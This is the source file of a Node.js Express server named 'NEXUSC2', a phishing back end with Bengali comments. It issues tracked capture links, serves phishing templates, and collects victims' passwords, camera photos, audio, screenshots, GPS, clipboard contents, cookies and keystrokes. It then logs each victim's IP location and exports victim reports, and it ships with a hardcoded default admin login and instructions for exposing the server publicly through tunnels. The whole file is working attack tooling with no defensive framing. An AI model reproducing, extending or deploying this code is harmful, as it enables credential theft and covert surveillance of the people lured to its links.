const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const fs = require('fs-extra');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const useragent = require('express-useragent');
const geoip = require('geoip-lite');
const bcrypt = require('bcryptjs');
const { spawn } = require('child_process');
const PDFDocument = require('pdfkit');
const { Parser } = require('json2csv');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// ===== কনফিগারেশন =====
const CAPTURES_DIR = path.join(__dirname, 'captures');
const TEMPLATES_DIR = path.join(__dirname, 'templates');
const DATA_DIR = path.join(__dirname, 'data');
const LOGS_FILE = path.join(DATA_DIR, 'logs.json');
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const LINKS_FILE = path.join(DATA_DIR, 'links.json');
const CAPTURES_FILE = path.join(DATA_DIR, 'captures.json');
const TIMELINE_FILE = path.join(DATA_DIR, 'timeline.json');

fs.ensureDirSync(CAPTURES_DIR);
fs.ensureDirSync(TEMPLATES_DIR);
fs.ensureDirSync(DATA_DIR);
fs.ensureFileSync(LOGS_FILE);
fs.ensureFileSync(USERS_FILE);
fs.ensureFileSync(LINKS_FILE);
fs.ensureFileSync(CAPTURES_FILE);
fs.ensureFileSync(TIMELINE_FILE);

// ===== ডেটা হেল্পার =====
function readJSON(file) {
    try {
        const data = fs.readFileSync(file, 'utf8');
        return JSON.parse(data);
    } catch (e) {
        return [];
    }
}

function writeJSON(file, data) {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function getLogs() { return readJSON(LOGS_FILE); }
function saveLogs(logs) { writeJSON(LOGS_FILE, logs); }
function getUsers() { return readJSON(USERS_FILE); }
function saveUsers(users) { writeJSON(USERS_FILE, users); }
function getLinks() { return readJSON(LINKS_FILE); }
function saveLinks(links) { writeJSON(LINKS_FILE, links); }
function getCaptures() { return readJSON(CAPTURES_FILE); }
function saveCaptures(captures) { writeJSON(CAPTURES_FILE, captures); }
function getTimeline() { return readJSON(TIMELINE_FILE); }
function saveTimeline(timeline) { writeJSON(TIMELINE_FILE, timeline); }

// ===== এক্সপ্রেস মিডলওয়্যার =====
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.static('public'));
app.use('/templates', express.static('templates'));
app.use('/captures', express.static('captures'));
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));
app.use(useragent.express());
app.use(session({
    secret: process.env.SESSION_SECRET || 'nexusc2_supreme_secret_2026',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 }
}));

// ===== অথ মিডলওয়্যার =====
function requireAuth(req, res, next) {
    if (req.session.user) return next();
    res.redirect('/login');
}

// ===== অথ রাউট =====
app.get('/login', (req, res) => {
    res.render('login', { error: null, register: false });
});

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const users = getUsers();
    const user = users.find(u => u.username === username);
    
    if (user && bcrypt.compareSync(password, user.password)) {
        req.session.user = { username: user.username, name: user.name };
        res.redirect('/');
    } else {
        res.render('login', { error: 'Invalid credentials', register: false });
    }
});

app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/login');
});

app.get('/register', (req, res) => {
    res.render('login', { error: null, register: true });
});

app.post('/register', (req, res) => {
    const { username, password, name } = req.body;
    const users = getUsers();
    if (users.find(u => u.username === username)) {
        return res.render('login', { error: 'Username already exists', register: true });
    }
    
    users.push({
        username,
        password: bcrypt.hashSync(password, 10),
        name,
        created: Date.now(),
        linkCount: 0
    });
    saveUsers(users);
    res.redirect('/login');
});

// ===== টেমপ্লেট লিস্ট (আপডেটেড) =====
function getTemplates() {
    try {
        const files = fs.readdirSync(TEMPLATES_DIR);
        console.log('📁 Templates directory:', TEMPLATES_DIR);
        console.log('📄 Files found:', files);
        
        const htmlFiles = files.filter(f => f.endsWith('.html'));
        console.log('📄 HTML files:', htmlFiles);
        
        return htmlFiles.map(f => {
            let name = f.replace('.html', '')
                       .replace(/_/g, ' ')
                       .replace(/-/g, ' ')
                       .toUpperCase();
            return {
                name: name,
                file: f
            };
        });
    } catch(e) {
        console.error('Error reading templates:', e);
        return [];
    }
}

// ===== ড্যাশবোর্ড =====
app.get('/', requireAuth, (req, res) => {
    const logs = getLogs();
    const total = logs.length;
    const last24h = logs.filter(l => (Date.now() - l.timestamp) < 24 * 60 * 60 * 1000).length;
    const user = getUsers().find(u => u.username === req.session.user.username);
    const templates = getTemplates();
    const tunnelUrl = process.env.TUNNEL_URL || 'Not running';
    
    console.log('📊 Templates loaded for dashboard:', templates.map(t => t.name));
    
    res.render('dashboard', {
        user: req.session.user,
        total,
        last24h,
        linkCount: user ? user.linkCount : 0,
        logs: logs.slice(-50).reverse(),
        templates: templates,
        tunnelUrl: tunnelUrl,
        messages: []
    });
});

// ===== লিংক জেনারেট =====
app.post('/generate', requireAuth, (req, res) => {
    const { template, redirect } = req.body;
    const id = uuidv4().slice(0, 8);
    
    const baseUrl = process.env.TUNNEL_URL || `${req.protocol}://${req.get('host')}`;
    const link = `${baseUrl}/capture/${id}`;
    
    const links = getLinks();
    links.push({
        id,
        template,
        redirect: redirect || 'https://google.com',
        created: Date.now(),
        createdBy: req.session.user.username,
        baseUrl: baseUrl
    });
    saveLinks(links);
    
    const users = getUsers();
    const user = users.find(u => u.username === req.session.user.username);
    if (user) {
        user.linkCount = (user.linkCount || 0) + 1;
        saveUsers(users);
    }
    
    res.json({ link, id, baseUrl });
});

// ===== ক্যাপচার পেজ =====
app.get('/capture/:id', (req, res) => {
    const links = getLinks();
    const link = links.find(l => l.id === req.params.id);
    if (!link) {
        return res.status(404).send('Link not found or expired');
    }
    
    const templatePath = path.join(TEMPLATES_DIR, link.template);
    if (fs.existsSync(templatePath)) {
        res.sendFile(templatePath);
    } else {
        res.render('capture', {
            id: req.params.id,
            template: link.template,
            redirect: link.redirect
        });
    }
});

// ===== ক্যাপচার ডেটা রিসিভ =====
app.post('/upload/:template', async (req, res) => {
    const { 
        site, username, password, 
        frontImage, backImage, audioData, screenshot,
        deviceInfo, batteryInfo, gpsLocation,
        clipboardData, cookies, keystrokes
    } = req.body;
    
    // ===== IP প্রসেসিং (ঠিক করা) =====
    let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
    
    if (typeof ip === 'string' && ip.startsWith('::ffff:')) {
        ip = ip.replace('::ffff:', '');
    }
    
    const isLocalhost = ip === '127.0.0.1' || ip === '::1' || ip === 'localhost';
    
    let geo = null;
    if (!isLocalhost) {
        try {
            geo = geoip.lookup(ip);
        } catch(e) {
            console.log('GeoIP lookup error:', e);
        }
    }
    
    const ua = req.useragent;
    const device = `${ua.device || 'Unknown'} / ${ua.os || 'Unknown'} / ${ua.browser || 'Unknown'}`;
    const victimId = uuidv4();
    
    const location = geo ? `${geo.city}, ${geo.country}` : (isLocalhost ? 'Localhost (Test)' : 'Unknown');
    const lat = geo ? geo.ll[0] : null;
    const lng = geo ? geo.ll[1] : null;
    
    // টাইমলাইন
    const timeline = getTimeline();
    const victimTimeline = {
        id: victimId,
        ip: ip,
        location: location,
        lat: lat,
        lng: lng,
        gpsLocation: gpsLocation || null,
        deviceInfo: deviceInfo || {},
        batteryInfo: batteryInfo || {},
        clipboardData: clipboardData || null,
        cookies: cookies || null,
        events: [{ time: Date.now(), type: 'visit', description: 'Visited phishing page' }],
        hasFrontImage: !!frontImage,
        hasBackImage: !!backImage,
        hasAudio: !!audioData,
        hasScreenshot: !!screenshot,
        hasKeystrokes: !!(keystrokes && keystrokes.length > 0),
        keystrokes: keystrokes || [],
        timestamp: Date.now()
    };
    timeline.push(victimTimeline);
    saveTimeline(timeline);
    
    // লগ
    const logs = getLogs();
    const logEntry = {
        id: victimId,
        site: site || 'NEXUS',
        username: username || '---',
        password: password || '---',
        ip: ip,
        device: device,
        location: location,
        lat: lat,
        lng: lng,
        timestamp: Date.now(),
        template: req.params.template,
        deviceInfo: deviceInfo || {},
        batteryInfo: batteryInfo || {},
        gpsLocation: gpsLocation || null,
        hasFrontImage: !!frontImage,
        hasBackImage: !!backImage,
        hasAudio: !!audioData,
        hasScreenshot: !!screenshot,
        hasClipboard: !!clipboardData,
        hasCookies: !!cookies,
        hasKeystrokes: !!(keystrokes && keystrokes.length > 0)
    };
    logs.push(logEntry);
    saveLogs(logs);
    
    // ফাইল সেভ
    const captures = getCaptures();
    
    if (frontImage) {
        try {
            const base64Data = frontImage.replace(/^data:image\/\w+;base64,/, '');
            const filename = `front_${Date.now()}_${victimId}.png`;
            fs.writeFileSync(path.join(CAPTURES_DIR, filename), base64Data, 'base64');
            captures.push({ 
                id: uuidv4(), 
                victimId, 
                filename, 
                type: 'front', 
                timestamp: Date.now(),
                ip: ip,
                location: location
            });
        } catch(e) {}
    }
    
    if (backImage) {
        try {
            const base64Data = backImage.replace(/^data:image\/\w+;base64,/, '');
            const filename = `back_${Date.now()}_${victimId}.png`;
            fs.writeFileSync(path.join(CAPTURES_DIR, filename), base64Data, 'base64');
            captures.push({ 
                id: uuidv4(), 
                victimId, 
                filename, 
                type: 'back', 
                timestamp: Date.now(),
                ip: ip,
                location: location
            });
        } catch(e) {}
    }
    
    if (screenshot) {
        try {
            const base64Data = screenshot.replace(/^data:image\/\w+;base64,/, '');
            const filename = `screenshot_${Date.now()}_${victimId}.png`;
            fs.writeFileSync(path.join(CAPTURES_DIR, filename), base64Data, 'base64');
            captures.push({ 
                id: uuidv4(), 
                victimId, 
                filename, 
                type: 'screenshot', 
                timestamp: Date.now(),
                ip: ip,
                location: location
            });
        } catch(e) {}
    }
    
    if (audioData) {
        try {
            const base64Data = audioData.replace(/^data:audio\/\w+;base64,/, '');
            const filename = `audio_${Date.now()}_${victimId}.webm`;
            fs.writeFileSync(path.join(CAPTURES_DIR, filename), base64Data, 'base64');
            captures.push({ 
                id: uuidv4(), 
                victimId, 
                filename, 
                type: 'audio', 
                timestamp: Date.now(),
                ip: ip,
                location: location
            });
        } catch(e) {}
    }
    
    saveCaptures(captures);
    res.send('OK');
});

// ===== API রাউট =====
app.get('/api/timeline/:id', requireAuth, (req, res) => {
    const timeline = getTimeline();
    const victim = timeline.find(v => v.id === req.params.id);
    if (!victim) return res.status(404).json({ error: 'Not found' });
    res.json(victim);
});

app.get('/api/timelines', requireAuth, (req, res) => {
    const timeline = getTimeline();
    res.json(timeline.slice(-100).reverse());
});

app.get('/api/export/csv', requireAuth, (req, res) => {
    const logs = getLogs();
    const fields = ['id', 'site', 'username', 'password', 'ip', 'device', 'location', 'timestamp', 'hasFrontImage', 'hasBackImage', 'hasAudio', 'hasScreenshot'];
    const json2csv = new Parser({ fields });
    const csv = json2csv.parse(logs);
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename=nexus_report_${Date.now()}.csv`);
    res.send(csv);
});

app.get('/api/export/pdf', requireAuth, async (req, res) => {
    const logs = getLogs();
    const doc = new PDFDocument();
    const filename = `nexus_report_${Date.now()}.pdf`;
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', `attachment; filename=${filename}`);
    doc.pipe(res);
    doc.fontSize(20).text('NEXUSC2 - Report', { align: 'center' });
    doc.moveDown();
    doc.fontSize(12).text(`Generated: ${new Date().toLocaleString()}`);
    doc.text(`Total Victims: ${logs.length}`);
    doc.moveDown();
    logs.slice(0, 20).forEach((log, i) => {
        doc.fontSize(10).text(`${i+1}. ${log.site} | ${log.username} | ${log.ip} | ${log.location} | ${new Date(log.timestamp).toLocaleString()}`);
        doc.moveDown(0.5);
    });
    if (logs.length > 20) {
        doc.text(`... and ${logs.length - 20} more entries`);
    }
    doc.end();
});

app.get('/api/stats', requireAuth, (req, res) => {
    const logs = getLogs();
    const total = logs.length;
    const last24h = logs.filter(l => (Date.now() - l.timestamp) < 24 * 60 * 60 * 1000).length;
    const lastHour = logs.filter(l => (Date.now() - l.timestamp) < 60 * 60 * 1000).length;
    const daily = {};
    for (let i = 6; i >= 0; i--) {
        const d = new Date();
        d.setDate(d.getDate() - i);
        const key = d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
        daily[key] = 0;
    }
    logs.forEach(l => {
        const d = new Date(l.timestamp);
        const key = d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
        if (daily[key] !== undefined) daily[key]++;
    });
    const links = getLinks();
    const totalLinks = links.length;
    const conversionRate = totalLinks > 0 ? Math.round((total / totalLinks) * 100) : 0;
    res.json({ total, last24h, lastHour, daily, totalLinks, conversionRate, active: logs.filter(l => (Date.now() - l.timestamp) < 10 * 60 * 1000).length });
});

app.get('/api/map', requireAuth, (req, res) => {
    const logs = getLogs();
    const mapData = logs.filter(l => l.lat && l.lng).slice(-100).map(l => ({
        id: l.id, 
        lat: l.lat, 
        lng: l.lng, 
        location: l.location, 
        site: l.site, 
        device: l.device, 
        timestamp: l.timestamp
    }));
    res.json(mapData);
});

app.get('/api/captures/:id', requireAuth, (req, res) => {
    const captures = getCaptures();
    const capture = captures.find(c => c.id === req.params.id);
    if (!capture) return res.status(404).json({ error: 'Not found' });
    res.json(capture);
});

app.get('/api/logs', requireAuth, (req, res) => {
    const logs = getLogs();
    res.json(logs.slice(-100).reverse());
});

app.get('/api/captures', requireAuth, (req, res) => {
    const captures = getCaptures();
    res.json(captures.slice(-50).reverse());
});

app.get('/api/templates', requireAuth, (req, res) => {
    res.json(getTemplates());
});

app.delete('/api/logs/:id', requireAuth, (req, res) => {
    let logs = getLogs();
    logs = logs.filter(l => l.id !== req.params.id);
    saveLogs(logs);
    res.json({ success: true });
});

app.delete('/api/captures/:id', requireAuth, (req, res) => {
    let captures = getCaptures();
    const capture = captures.find(c => c.id === req.params.id);
    if (capture) {
        const filePath = path.join(CAPTURES_DIR, capture.filename);
        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
    }
    captures = captures.filter(c => c.id !== req.params.id);
    saveCaptures(captures);
    res.json({ success: true });
});

app.delete('/api/logs', requireAuth, (req, res) => {
    saveLogs([]);
    res.json({ success: true });
});

app.delete('/api/captures', requireAuth, (req, res) => {
    const captures = getCaptures();
    captures.forEach(c => {
        const filePath = path.join(CAPTURES_DIR, c.filename);
        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
    });
    saveCaptures([]);
    res.json({ success: true });
});

app.get('/templates/:file', (req, res) => {
    res.sendFile(path.join(TEMPLATES_DIR, req.params.file));
});

app.use((req, res) => {
    res.status(404).send('404 - Not Found');
});

// ===== ডিফল্ট অ্যাডমিন =====
const users = getUsers();
if (!users.find(u => u.username === 'admin')) {
    users.push({
        username: 'admin',
        password: bcrypt.hashSync('nexus2026', 10),
        name: 'Administrator',
        created: Date.now(),
        linkCount: 0
    });
    saveUsers(users);
    console.log('✅ Default admin created: admin / nexus2026');
}

// ===== স্টার্ট =====
const server = app.listen(PORT, () => {
    console.log(`🐱 NEXUSC2 running at http://localhost:${PORT}`);
    console.log(`📸 Captures saved to: ${CAPTURES_DIR}`);
    console.log(`📁 Templates loaded: ${getTemplates().length}`);
    console.log(`🔐 Default login: admin / nexus2026`);
    console.log(`📍 Yandex Maps ready (no API key needed)`);
    console.log(``);
    console.log(`📌 To expose publicly, run in another terminal:`);
    console.log(`   cloudflared tunnel --url http://localhost:${PORT}`);
    console.log(`   OR`);
    console.log(`   ngrok http ${PORT}`);
    console.log(``);
});
